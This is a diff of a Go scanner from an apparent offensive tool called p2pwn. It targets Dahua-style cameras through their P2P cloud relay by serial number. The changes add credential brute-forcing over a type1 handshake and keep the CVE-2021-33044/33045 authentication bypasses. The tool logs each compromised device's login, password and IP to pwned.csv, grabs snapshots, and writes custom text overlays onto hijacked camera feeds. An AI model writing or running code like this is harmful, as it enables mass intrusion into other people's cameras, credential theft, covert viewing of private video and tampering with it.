@@ -11,7 +11,13 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/fatih/color"
 	"github.com/thebadinteger/p2pwn/core/p2p"
+)
+
+var (
+	scanRed   = color.New(color.FgHiRed)
+	scanGreen = color.New(color.FgGreen)
 )
 
 type Scanner struct {
@@ -30,13 +36,12 @@ type Scanner struct {
 	WasteCount     int64
 
 	// Sync
-	mu           sync.Mutex
-	wg           sync.WaitGroup
-	snapshotWg   sync.WaitGroup
-	cancelOnce   sync.Once
-	pwnedList    []ExploitResult
-	cancelChan   chan struct{}
-	interrupted  bool
+	mu         sync.Mutex
+	wg         sync.WaitGroup
+	snapshotWg sync.WaitGroup
+	cancelOnce sync.Once
+	pwnedList  []ExploitResult
+	cancelChan chan struct{}
 }
 
 func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string) *Scanner {
@@ -55,15 +60,12 @@ func (s *Scanner) Run() {
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		s.mu.Lock()
-		s.interrupted = true
-		s.mu.Unlock()
 		s.cancelOnce.Do(func() { close(s.cancelChan) })
 
 		nowStr := time.Now().Format("15:04:05")
-		fmt.Printf("\r\n\x1b[91m[%s] Interrupted\x1b[0m\n", nowStr)
+		fmt.Printf("\r\n")
+		scanRed.Printf("[%s] Interrupted\n", nowStr)
 
-		s.writePwnedFinished()
 		os.Exit(0)
 	}()
 
@@ -95,7 +97,7 @@ func (s *Scanner) Run() {
 	s.TotalCount = total
 
 	nowStr := time.Now().Format("15:04:05")
-	fmt.Printf("\x1b[91m[%s] p2pwn\x1b[0m\n", nowStr)
+	scanRed.Printf("[%s] p2pwn\n", nowStr)
 	fmt.Printf("[input] > %s\n", s.InputSource)
 	fmt.Printf("[count] > %d\n", s.TotalCount)
 	fmt.Printf("[output] > %s\n", s.OutDir)
@@ -151,18 +153,71 @@ func (s *Scanner) Run() {
 				}
 				var ok bool
 				var finalClient *p2p.DHClient
+				var requiresType1 bool
+
+				var lastErr error
 				for attempt := 0; attempt < retries; attempt++ {
-					client := p2p.NewDHClient(serial, false)
+					client := p2p.NewDHClient(serial)
 					client.SetRetries(retries)
 					err := client.Handshake()
-					if err != nil {
-						client.Close()
-						continue
+					lastErr = err
+					if err == nil {
+						// type0 success. skip type1
+						finalClient = client
+						ok = true
+						break
 					}
-					finalClient = client
-					ok = true
-					break
+					client.Close()
+					if p2p.IsChannelAuthRequired(err) {
+						requiresType1 = true
+						break // break to type1
+					}
 				}
+
+				// all attempts failed, assume type1
+				if !ok && !requiresType1 && lastErr != nil {
+					if strings.Contains(lastErr.Error(), "timeout") || strings.Contains(lastErr.Error(), "no response") {
+						requiresType1 = true
+					}
+				}
+
+				if !ok && requiresType1 {
+					if probe := tryType0Tunnel(serial, retries); probe != nil {
+						finalClient = probe
+						ok = true
+					} else {
+						if !s.Config.Pwn.Protocol["type1"] {
+							s.mu.Lock()
+							s.OnlineCount++
+							s.CompletedCount++
+							s.mu.Unlock()
+							continue
+						}
+
+						if s.Config.Pwn.Methods["brute"] && len(s.Config.Brute.Credentials) > 0 {
+							type1Delay := 0
+							if val, err := getIntValue(s.Config.Brute.Type1.Delay); err == nil && val > 0 {
+								type1Delay = val
+							}
+							for _, cred := range s.Config.Brute.Credentials {
+								if type1Delay > 0 {
+									time.Sleep(time.Duration(type1Delay) * time.Second)
+								}
+								authClient := p2p.NewDHClient(serial)
+								authClient.SetRetries(retries)
+								authClient.SetDeviceAuth(cred.Login, cred.Password, "")
+								authErr := authClient.Handshake()
+								if authErr == nil {
+									finalClient = authClient
+									ok = true
+									break
+								}
+								authClient.Close()
+							}
+						}
+					}
+				}
+
 				if ok && finalClient != nil {
 					s.mu.Lock()
 					s.OnlineCount++
@@ -211,9 +266,24 @@ cleanup:
 	s.printProgress()
 	fmt.Println()
 
-	s.writePwnedFinished()
 	doneTimeStr := time.Now().Format("15:04:05")
-	fmt.Printf("\x1b[32m[%s] Done\x1b[0m\n", doneTimeStr)
+	scanGreen.Printf("[%s] Done\n", doneTimeStr)
+}
+
+func tryType0Tunnel(serial string, retries int) *p2p.DHClient {
+	client := p2p.NewDHClient(serial)
+	client.SetRetries(retries)
+	if err := client.Handshake(); err != nil {
+		client.Close()
+		return nil
+	}
+	if err := client.EstablishDirectP2P(); err != nil {
+		if err = client.CompleteRelayHandshake(); err != nil {
+			client.Close()
+			return nil
+		}
+	}
+	return client
 }
 
 func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
@@ -223,13 +293,8 @@ func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 	}
 
 	for attempt := 0; attempt < retries; attempt++ {
-		err := client.PTCPHandshake()
-		if err != nil {
-			continue
-		}
-
 		directOK := true
-		err = client.EstablishDirectP2P()
+		err := client.EstablishDirectP2P()
 		if err != nil {
 			directOK = false
 			err = client.CompleteRelayHandshake()
@@ -266,7 +331,7 @@ func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 
 func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2p.PTCPTunnel, directOK bool) {
 	reopenVerifiedTunnel := func(res *ExploitResult) (*p2p.PTCPTunnel, bool) {
-		if res == nil || !strings.HasPrefix(res.Method, "CVE-2021-") || res.Login == "" || res.Password == "" {
+		if res == nil || (res.Method != "cve-2021-33044" && res.Method != "cve-2021-33045") || res.Login == "" || res.Password == "" {
 			return tunnel, false
 		}
 		tunnel.Disconnect()
@@ -305,7 +370,48 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 	}
 
-	// 1. CVE exploits
+	// device was already authenticated, collect info and save
+	if client.IsPwnedAuth() {
+		user, pass, _, _ := client.GetDeviceAuth()
+		tunnel.SetAuth(user, pass)
+
+		model, channels, _, err := tunnel.GetDeviceInfo()
+		if err != nil || model == "" {
+			sdk := p2p.NewSDKClient(tunnel, user, pass)
+			if _, m, ch, sErr := sdk.GetDeviceInfo(); sErr == nil {
+				if m != "" {
+					model = m
+				}
+				if ch > 0 {
+					channels = ch
+				}
+			}
+		}
+		if model == "" {
+			model = "Dahua Device"
+		}
+		if channels == 0 {
+			channels = 1
+		}
+		res := &ExploitResult{
+			Method:   "type1",
+			Login:    user,
+			Password: pass,
+			Model:    model,
+			Channels: channels,
+			IP:       ip,
+		}
+		s.handlePwned(serial, res)
+		s.applyOSD(serial, tunnel, res)
+		if !s.launchSnapshot(serial, res) {
+			s.mu.Lock()
+			s.CompletedCount++
+			s.mu.Unlock()
+		}
+		return
+	}
+
+	// CVE exploits
 	if s.Config.Pwn.Protocol["cgi"] {
 		if s.Config.Pwn.Methods["cve-2021-33044"] {
 			res, err := TryCVE2021_33044(tunnel)
@@ -316,6 +422,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				}
 				res.IP = ip
 				s.handlePwned(serial, res)
+				s.applyOSD(serial, tunnel, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -334,6 +441,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				}
 				res.IP = ip
 				s.handlePwned(serial, res)
+				s.applyOSD(serial, tunnel, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -348,6 +456,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			if err == nil && res != nil {
 				res.IP = ip
 				s.handlePwned(serial, res)
+				s.applyOSD(serial, tunnel, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -362,6 +471,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			if err == nil && res != nil {
 				res.IP = ip
 				s.handlePwned(serial, res)
+				s.applyOSD(serial, tunnel, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -372,12 +482,18 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 	}
 
-	// 2. SDK Brute
-	if s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"] {
+	runSDK := s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"]
+	if runSDK && s.Config.Pwn.Protocol["cgi"] {
+		if model, _, _, _ := tunnel.GetDeviceInfo(); model != "" {
+			runSDK = false
+		}
+	}
+	if runSDK {
 		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials)
 		if err == nil && res != nil {
 			res.IP = ip
 			s.handlePwned(serial, res)
+			s.applyOSD(serial, tunnel, res)
 			if !s.launchSnapshot(serial, res) {
 				s.mu.Lock()
 				s.CompletedCount++
@@ -391,6 +507,79 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 	s.SafeCount++
 	s.CompletedCount++
 	s.mu.Unlock()
+}
+
+func (s *Scanner) dialFreshTunnel(serial string, res *ExploitResult) (*p2p.PTCPTunnel, func(), bool) {
+	retries := 3
+	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
+		retries = val
+	}
+	login, pass := res.Login, res.Password
+	isType1 := res.Method == "type1"
+	for attempt := 0; attempt < retries; attempt++ {
+		client := p2p.NewDHClient(serial)
+		client.SetRetries(retries)
+		if isType1 {
+			client.SetDeviceAuth(login, pass, "")
+		}
+		if err := client.Handshake(); err != nil {
+			client.Close()
+			if !isType1 && p2p.IsChannelAuthRequired(err) && login != "" && pass != "" {
+				client = p2p.NewDHClient(serial)
+				client.SetRetries(retries)
+				client.SetDeviceAuth(login, pass, "")
+				if err := client.Handshake(); err != nil {
+					client.Close()
+					continue
+				}
+			} else {
+				continue
+			}
+		}
+		directOK := true
+		if err := client.EstablishDirectP2P(); err != nil {
+			directOK = false
+			if err = client.CompleteRelayHandshake(); err != nil {
+				client.Close()
+				continue
+			}
+		}
+		stopHB := make(chan struct{})
+		client.StartHeartbeat(stopHB)
+		var tunnel *p2p.PTCPTunnel
+		if directOK {
+			tunnel = client.NewDirectTunnel()
+		} else {
+			tunnel = client.NewTunnel()
+		}
+		cleanup := func() {
+			tunnel.Disconnect()
+			close(stopHB)
+			client.Close()
+		}
+		return tunnel, cleanup, true
+	}
+	return nil, nil, false
+}
+
+func (s *Scanner) applyOSD(serial string, tunnel *p2p.PTCPTunnel, res *ExploitResult) {
+	if !s.Config.Overlay.Osd {
+		return
+	}
+	if res == nil || res.Login == "" || res.Password == "" {
+		return
+	}
+	channel := normalizeOSDChannel(s.Config.Overlay.Channel)
+	lines := normalizeOSDLines(s.Config.Overlay.Custom)
+	if channel == "" && len(lines) == 0 {
+		return
+	}
+	redial := func() (*p2p.PTCPTunnel, func(), bool) {
+		return s.dialFreshTunnel(serial, res)
+	}
+	if err := TryOSD(tunnel, res.Login, res.Password, channel, lines, redial); err != nil {
+		return
+	}
 }
 
 func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
@@ -419,17 +608,29 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 		}
 
 		for attempt := 0; attempt < retries; attempt++ {
-			client := p2p.NewDHClient(serial, false)
+			client := p2p.NewDHClient(serial)
 			client.SetRetries(retries)
-			if err := client.Handshake(); err != nil {
-				client.Close()
-				continue
-			}
-			if err := client.PTCPHandshake(); err != nil {
-				client.Close()
-				continue
+
+			isType1 := (method == "type1")
+			if isType1 {
+				client.SetDeviceAuth(login, password, "")
 			}
 
+			if err := client.Handshake(); err != nil {
+				client.Close()
+				if !isType1 && p2p.IsChannelAuthRequired(err) && login != "" && password != "" {
+					client = p2p.NewDHClient(serial)
+					client.SetRetries(retries)
+					client.SetDeviceAuth(login, password, "")
+
+					if err := client.Handshake(); err != nil {
+						client.Close()
+						continue
+					}
+				} else {
+					continue
+				}
+			}
 			directOK := true
 			if err := client.EstablishDirectP2P(); err != nil {
 				directOK = false
@@ -478,12 +679,13 @@ func (s *Scanner) handlePwned(serial string, res *ExploitResult) {
 	s.PwnedCount++
 	s.pwnedList = append(s.pwnedList, *res)
 
-	// Append to pwned.txt
-	pwnedFile := filepath.Join(s.OutDir, "pwned.txt")
+	// Append to pwned.csv
+	pwnedFile := filepath.Join(s.OutDir, "pwned.csv")
 	f, err := os.OpenFile(pwnedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
-		line := fmt.Sprintf("[%s] Credentials: %s:%s | S/N: %s | Channels: %d | IP: %s > %s\n",
-			res.Model, res.Login, res.Password, serial, res.Channels, res.IP, formatVulnLabel(res.Method))
+		line := fmt.Sprintf("%s,%s,%s,%s,%d,%s,%s\n",
+			csvField(serial), csvField(res.Model), csvField(res.Login), csvField(res.Password),
+			res.Channels, csvField(res.IP), csvField(res.Method))
 		f.WriteString(line)
 		f.Close()
 	}
@@ -493,15 +695,11 @@ func (s *Scanner) handlePwned(serial string, res *ExploitResult) {
 	s.mu.Unlock()
 }
 
-func formatVulnLabel(method string) string {
-	switch method {
-	case "Brute Force (CGI)":
-		return "CGI Brute"
-	case "Brute Force (SDK)":
-		return "SDK Brute"
-	default:
-		return method
+func csvField(s string) string {
+	if strings.ContainsAny(s, "\",\n\r") {
+		return "\"" + strings.ReplaceAll(s, "\"", "\"\"") + "\""
 	}
+	return s
 }
 
 func (s *Scanner) writeXMLFiles(serial string, res *ExploitResult) {
@@ -524,7 +722,7 @@ func (s *Scanner) writeXMLFiles(serial string, res *ExploitResult) {
 	} else {
 		data, err := os.ReadFile(xmlPath)
 		if err != nil {
-			// Corrupted or unreadable; start fresh.
+			// Corrupted or unreadable
 			var sb strings.Builder
 			sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
 			sb.WriteString("<DeviceManager version=\"2.0\">\n")
@@ -540,24 +738,16 @@ func (s *Scanner) writeXMLFiles(serial string, res *ExploitResult) {
 }
 
 func (s *Scanner) writePwnedStart() {
-	pwnedFile := filepath.Join(s.OutDir, "pwned.txt")
-	f, err := os.OpenFile(pwnedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err == nil {
-		nowStr := time.Now().Format("02-01-2006 15:04:05")
-		line := fmt.Sprintf("# [%s] Scan started | input > %s | count > %d | output > %s | threads > %d\n",
-			nowStr, s.InputSource, s.TotalCount, s.OutDir, s.Threads)
-		f.WriteString(line)
-		f.Close()
+	pwnedFile := filepath.Join(s.OutDir, "pwned.csv")
+	needHeader := false
+	if st, err := os.Stat(pwnedFile); os.IsNotExist(err) || st.Size() == 0 {
+		needHeader = true
 	}
-}
-
-func (s *Scanner) writePwnedFinished() {
-	pwnedFile := filepath.Join(s.OutDir, "pwned.txt")
 	f, err := os.OpenFile(pwnedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
-		nowStr := time.Now().Format("02-01-2006 15:04:05")
-		line := fmt.Sprintf("\n# [%s] Scan finished\n", nowStr)
-		f.WriteString(line)
+		if needHeader {
+			f.WriteString("sn,model,login,password,channels,ip,vuln\n")
+		}
 		f.Close()
 	}
 }
